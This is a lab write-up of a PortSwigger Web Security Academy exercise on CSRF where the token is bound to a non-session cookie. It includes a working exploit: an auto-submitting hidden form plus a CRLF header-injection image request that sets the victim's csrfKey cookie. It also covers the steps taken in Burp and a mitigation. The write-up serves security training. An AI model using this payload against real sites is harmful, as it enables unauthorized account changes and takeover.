## Lab 05: CSRF Where Token Is Tied to Non-Session Cookie

### Platform

PortSwigger Web Security Academy

### Difficulty

Practitioner

### Topic

Cross-Site Request Forgery / CSRF Token Cookie Binding

### Lab Status

Solved

### Objective

Exploit a CSRF vulnerability where the CSRF token is tied to a non-session cookie instead of the user's session.

### Simple Explanation

The application uses a CSRF token and a cookie called `csrfKey`.

The problem is that the CSRF token is linked to the `csrfKey` cookie, not to the actual logged-in session.

This means an attacker can use their own valid `csrf` token and matching `csrfKey`, force the victim's browser to set that same `csrfKey`, then submit a valid email change request.

### Vulnerability Description

The email change request requires:

```text
email
csrf
```

The browser also sends a cookie called:

```text
csrfKey
```

The application checks if the `csrf` token matches the `csrfKey`, but it does not properly tie them to the victim's session.

This allows a CSRF attack if the attacker can set the victim's `csrfKey` cookie.

### Exploit Used

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="csrf-final-test@test.com">
    <input type="hidden" name="csrf" value="PASTE-CSRF-TOKEN-HERE">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=PASTE-CSRFKEY-HERE%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

### Exploit Explanation

The form sends the email change request.

The hidden `csrf` input contains a valid CSRF token from my account.

The image request is used to inject a `Set-Cookie` header and set the victim's `csrfKey` cookie:

```text
Set-Cookie: csrfKey=PASTE-CSRFKEY-HERE; SameSite=None
```

When the image fails to load, the `onerror` event submits the form automatically.

Because the victim now has the matching `csrfKey` cookie, the application accepts the request.

### Steps Taken

Logged in using the provided account:

```text
Username: wiener
Password: peter
```

Opened `/my-account`.

Intercepted the email change request in Burp.

Copied the matching values from the same request:

```text
csrf token
csrfKey cookie
```

Dropped the request.

Created the exploit in the Exploit Server using the copied `csrf` token and `csrfKey`.

Stored the exploit.

Delivered the exploit to the victim.

The lab was solved.

### Result

The victim's email was changed using a CSRF token and `csrfKey` cookie taken from my own account.

### What I Learned

I learned that CSRF tokens must be tied to the user's session, not only to a separate cookie.

### Security Impact

An attacker could reuse their own CSRF token and cookie pair to perform actions in another user's session.

### Mitigation

Bind CSRF tokens to the user's session and avoid relying on separate non-session cookies for CSRF validation.

### Tools Used

PortSwigger Web Security Academy

Burp Suite Community Edition

Burp Proxy

Exploit Server

Web Browser
